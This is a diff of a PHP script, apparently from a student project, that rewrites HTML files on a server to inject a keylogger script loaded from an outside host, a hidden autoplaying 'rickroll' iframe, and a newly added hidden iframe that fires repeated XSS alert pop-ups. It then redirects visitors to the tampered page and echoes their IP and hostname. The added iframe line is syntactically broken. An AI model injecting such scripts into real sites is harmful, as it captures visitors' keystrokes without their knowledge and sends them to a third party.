@@ -48,7 +48,9 @@ foreach($html->find('img') as $element){
 //ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
 //ADDING RICKROLL ATTACK TEST
 $keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
-$textToInsert="script src='$keyloggerscript'></script>"."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
+$ddosscript ="<iframe id='iframe' width ='0' height='0' src='javascript:for(var i=0;i < 10;i++){alert("XSS")}' frameborder='0' </iframe>"
+
+$textToInsert="script src='$keyloggerscript'></script>".$ddosscript."<iframe width='0' height='0' src='https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1' frameborder='0'></iframe>";
 $contents = file_get_contents("$htmlFileName");
 $newContent = preg_replace("</body>", $textToInsert."</body", $contents);
 file_put_contents($htmlFileName, $newContent);
@@ -71,7 +73,6 @@ echo gethostbyaddr("$ip");
 echo "\n".$ip."\n";
 //depends on location / this ip for good result 12.215.42.19 ;
 //$check = file_get_contents("http://api.hostip.info/get_html.php?ip='$ip'&position=true");
-//echo $check;
 //REDIRECTING TO LONG LINK
 header("Location:".$htmlFileName, true, 303);
 die();
